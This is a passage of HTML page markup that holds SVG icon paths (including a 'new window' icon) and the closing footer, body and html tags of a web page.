63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
